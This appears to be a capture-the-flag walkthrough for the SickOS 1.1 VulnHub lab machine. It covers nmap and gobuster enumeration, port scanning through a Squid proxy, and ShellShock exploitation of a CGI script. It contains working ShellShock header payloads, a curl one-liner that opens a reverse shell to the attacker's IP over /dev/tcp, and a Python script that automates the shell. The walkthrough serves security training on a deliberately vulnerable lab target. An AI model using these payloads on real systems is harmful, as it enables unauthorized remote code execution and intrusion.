---

---

![](../../Images/SickOS%201.1.png)


- Squid Proxy
- ShellShock Attack

---

Welcome to everyone, today we are going exploiting [SickOS 1.1](https://www.vulnhub.com/entry/sickos-11,132/) machine in [VulnHub](https://www.vulnhub.com/) platform

We have to download the ZIP and export this in our app ([Oracle Vritual Box](https://www.virtualbox.org/) or [VMWare](https://www.vmware.com/es/products/workstation-player/workstation-player-evaluation.html))

---

# Recon


The first of all we are going to do a local scan to identify the host in our network:

We are going to use [arp-scan](../../Tools/Enumeration/arp-scan/arp-scan.md)

````bash
sudo arp-scan -l --ignoredups
````

`-l` --> Do the arp scan in our **local network**

This use the local adapter, in my case is eth0, if you want to indicate other that are not by default, you can use `-I interfacename`

`--ignoredups` --> This switch is used to avoid duplicated IP 

![](../../Images/Pasted%20image%2020230831173638.png)

Now we are going to create our works directory

> mkdir {nmap.data,exploit}

Now we are going to try if the machine is available

> ping -c 1 192.168.1.38


![](../../Images/Pasted%20image%2020230831173723.png)

Don't worry if the ping don't work, if you realize an port scan with [Nmap](../../Tools/Enumeration/Nmap/Nmap.md), you can see that return some open ports

````bash
sudo nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 192.168.1.38 -oG allPorts
````

![](../../Images/Pasted%20image%2020230831173703.png)

Now with [ExtractPorts](../../Utils/S4vitaar/ExtractPorts/ExtractPorts.md) (util from [S4vitaar](https://www.youtube.com/s4vitar)) we can copy the ports to the clipboard and the information looks better.

![](../../Images/Pasted%20image%2020230831174725.png)

Now we can use an advance scan to discover the service and version that are running for this ports.

````bash
sudo nmap -sCV -p22,3128 192.168.1.38 -oN targeted
````

`-sCV` --> C launch some scripts to enum the services, and V for know the version of the services, these are two separated switches but can be used together

`-oN` --> Export the information in a file with **nmap format** (how you see in the output)

![](../../Images/Pasted%20image%2020230831175056.png)

We do a curl, but we don't get anything

````bash
curl http://website
````

In port scanning you don't have to see the 80 port open, if you realize an scan of the port 80 with nmap, they say that is **filtered**

````bash
sudo nmap -p80 192.168.1.38 -T5 -v -n
````

![](../../Images/Pasted%20image%2020230831175504.png)


You can try to use a proxy with curl command:
````bash
curl http://192.168.1.38 --proxy http://192.168.1.38:3128
````

Remember that the port 3128 was reported by nmap when scanning ports.

You can add an entry in [FoxyProxy](https://addons.mozilla.org/es/firefox/addon/foxyproxy-standard/): 

![](../../Images/Pasted%20image%2020230831175738.png)

If you enable it and put the ip you can see the website

Now you can use [Gobuster](../../Tools/Enumeration/Gobuster.md) to enum directories with the switch **--proxy **

````bash
gobuster dir -u http://192.168.1.38 --proxy http://192.168.1.38:3128 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
````

![](../../Images/Pasted%20image%2020230831180156.png)

You can enumerate the internal port with an script in Python, this is in [Enumeration and exploiting SQUID Proxies](../../OWASP%20TOP%2010%20and%20web%20vulnerabilities/Enumeration%20and%20exploiting%20SQUID%20Proxies/Enumeration%20and%20exploiting%20SQUID%20Proxies.md)

````python
#!/usr/bin/python3

import sys, signal, requests

# Global variables

main_url = "http://127.0.0.1"
squid_proxy = {'http': 'http://192.168.1.38:3128'}

# Ctrl_c

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)


signal.signal(signal.SIGINT, def_handler)

def portDiscovery():
    common_tcp_ports = {20, 21, 22, 23, 25, 53, 80, 110, 115, 119, 135, 137, 138, 139, 143, 161, 194, 389, 443, 445,
                   465, 514, 515, 587, 636, 993, 995, 1080, 1433, 1434, 1521, 1723, 2049, 2082, 2083, 2086, 2087,
                   2095, 2096, 3306, 3389, 5432, 5500, 5800, 5900, 6000, 6660, 6661, 6662, 6663, 6664, 6665, 6666, 6667, 6668, 6669}
    
    for tcp_port in common_tcp_ports:
        
        r = requests.get(main_url + ':' + str(tcp_port), proxies=squid_proxy)

        if r.status_code != 503:

            print("[+] Open Port: " + str(tcp_port))

if __name__ == '__main__':
    portDiscovery()

````

![](../../Images/Pasted%20image%2020230831183405.png)

We can see in the internal ports that the service 80 and 3306 (MySQL) are exposed

We can do a curl to the port 3306

> curl http://127.0.0.1:3306 --proxy http://192.168.1.38:3128

![](../../Images/Pasted%20image%2020230831183554.png)

They say that we have to use the switch **--output** because is a binary file

> curl http://127.0.0.1:3306 --proxy http://192.168.1.38:3128 --output output

![](../../Images/Pasted%20image%2020230831183740.png)

Sometimes you need an **authentication**, you can this in the url:

> curl http://website --proxy http://admin:password@192.168.1.12:3128

---
## Exploiting Shell Shock

Remember where you are enum a server if you add an slash at the final you can discover more resources

````bash
gobuster dir -u http://192.168.1.38 --proxy http://192.168.1.38:3128 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
````

`--add-slash` --> We add this switch to add an slash at the final

![](../../Images/Pasted%20image%2020230901140219.png)

Normally if you find a **/cgi-bin/** is recommendable to enum a [ShellShock Attack](../../OWASP%20TOP%2010%20and%20web%20vulnerabilities/ShellShock%20Attack/ShellShock%20Attack.md) 

With gobuster you can enum some extensions like pl, sh, cgi

````bash
gobuster dir -u http://192.168.1.38/cgi-bin/ --proxy http://192.168.1.38:3128 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash -x pl,sh,cgi
````

In this case we found a /status/

![](../../Images/Pasted%20image%2020230901141658.png)

If you open with the explorer you see this:

![](../../Images/Pasted%20image%2020230901141914.png)

If you reload the website, the uptime is changing

We can use curl and jq to see the data 

````bash
curl -s http://127.0.0.1/cgi-bin/status --proxy http://192.168.1.38:3128 | jq
````

`-s` --> Don't show the verbose of the curl command

`jq` --> Command to see better the json files

In this case we are going to util this:

````bash
curl -s http://127.0.0.1/cgi-bin/status --proxy http://192.168.1.38:3128 -H "User-Agent: () { :; }; /usr/bin/whoami"
````


![](../../Images/Pasted%20image%2020230901143137.png)

If you see at the first that the response don't return the output of the command you have to put echo; and the command

Sometimes you have to put more than one echo;

You have to use absolute paths to indicate the command, remember, in different system the path of the commands are different

````bash
curl -s http://127.0.0.1/cgi-bin/status --proxy http://192.168.1.38:3128 -H "User-Agent: () { :; }; echo; /usr/bin/whoami"
````

![](../../Images/Pasted%20image%2020230901143215.png)

Now you can see that the output is ok

---

## Gaining access to the machine

We can do the oneliner for gain access to the machine

In shellshock is recommendable to put the **absolute path for the bash **

````bash
curl -s http://127.0.0.1/cgi-bin/status --proxy http://192.168.1.38:3128 -H "User-Agent: () { :; }; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.1.39/443 0>&1'" 
````

In some system will be /bin/bash or /usr/bin/bash

In this case is /bin/bash

We listening in 443 port and send the malicious curl request

And nice!! We gain access to the machine

![](../../Images/Pasted%20image%2020230901144013.png)

---

## Python scripting

We can automate this, we can reuse the python script from squid proxy 

````python
#!/usr/bin/python3

import sys, signal, requests, threading
from pwn import *

# Global variables

main_url = "http://127.0.0.1/cgi-bin/status"
squid_proxy = {'http': 'http://192.168.1.38:3128'}
lport=443

# Ctrl_c

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)


signal.signal(signal.SIGINT, def_handler)

def shellShock_attack():
    headers = {'User-Agent': "() { :; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.1.39/443 0>&1'"}

    r = requests.get(main_url, headers=headers, proxies=squid_proxy)

if __name__ == '__main__':
    try:
        threading.Thread(target=shellShock_attack, args=()).start() # Executing in background
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()

    if shell.sock is None:
        log.failure("A connection could not be established")
        sys.exit(1)
    else:
        shell.interactive()

````

---

# Tags

#machine #recon #nmap #gnu/linux #squidproxies #shellshock #gobuster